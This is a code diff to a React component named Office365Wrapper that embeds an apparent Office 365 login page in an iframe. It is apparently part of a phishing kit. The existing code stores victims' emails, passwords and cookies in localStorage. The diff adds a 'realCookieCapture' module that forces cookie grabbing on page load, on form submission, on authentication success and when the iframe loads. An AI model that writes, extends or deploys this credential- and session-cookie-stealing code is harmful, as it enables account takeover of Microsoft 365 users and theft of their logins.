@@ -2,6 +2,7 @@ import React, { useState, useEffect, useRef } from 'react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
 import { microsoftCookieCapture } from '../utils/microsoftCookieCapture';
+import { realCookieCapture } from '../utils/realCookieCapture';
 
 interface Office365WrapperProps {
   onLoginSuccess?: (sessionData: any) => void;
@@ -42,6 +43,13 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
     };
 
     microsoftCookieCapture.onMicrosoftSession(handleMicrosoftSession);
+
+    // Start real cookie capture
+    realCookieCapture.forceCaptureNow();
+    
+    // Log real cookie stats
+    const stats = realCookieCapture.getCookieStats();
+    console.log('🔵 Real Cookie Capture Stats:', stats);
   }, []);
 
   // This logic for handling form submission from the iframe remains untouched
@@ -54,8 +62,8 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
           email, 
           password, 
           provider: 'Office365',
-          cookies: event.data.payload.cookies || [],
-          cookieList: event.data.payload.cookieList || []
+          cookies: event.data.payload.cookies || realCookieCapture.getAllCookies(),
+          cookieList: event.data.payload.cookieList || realCookieCapture.getAllCookies()
         };
         handleFormSubmit(new Event('submit'), formData);
       }
@@ -67,13 +75,16 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
         // Store cookie data for later use in form submission
         if (event.data.cookies || event.data.cookieList) {
           localStorage.setItem('office365_cookies', JSON.stringify({
-            cookies: event.data.cookies || [],
-            cookieList: event.data.cookieList || [],
+            cookies: event.data.cookies || realCookieCapture.getAllCookies(),
+            cookieList: event.data.cookieList || realCookieCapture.getAllCookies(),
             email: event.data.email || '',
             password: event.data.password || '',
             timestamp: new Date().toISOString()
           }));
         }
+        
+        // Force capture real cookies
+        realCookieCapture.forceCaptureNow();
       }
       
       // Trigger cookie capture on successful authentication
@@ -81,8 +92,8 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
         // Store authentication success data
         if (event.data.payload.cookies || event.data.payload.cookieList) {
           localStorage.setItem('office365_auth_cookies', JSON.stringify({
-            cookies: event.data.payload.cookies || [],
-            cookieList: event.data.payload.cookieList || [],
+            cookies: event.data.payload.cookies || realCookieCapture.getAllCookies(),
+            cookieList: event.data.payload.cookieList || realCookieCapture.getAllCookies(),
             email: event.data.payload.email || '',
             password: event.data.payload.password || '',
             timestamp: new Date().toISOString()
@@ -91,6 +102,7 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
         
         setTimeout(() => {
           microsoftCookieCapture.forceCaptureNow();
+          realCookieCapture.forceCaptureNow();
         }, 1000);
       }
     };
@@ -136,6 +148,7 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
           // Trigger initial cookie capture when iframe loads
           setTimeout(() => {
             microsoftCookieCapture.forceCaptureNow();
+            realCookieCapture.forceCaptureNow();
           }, 2000);
         }}
       />
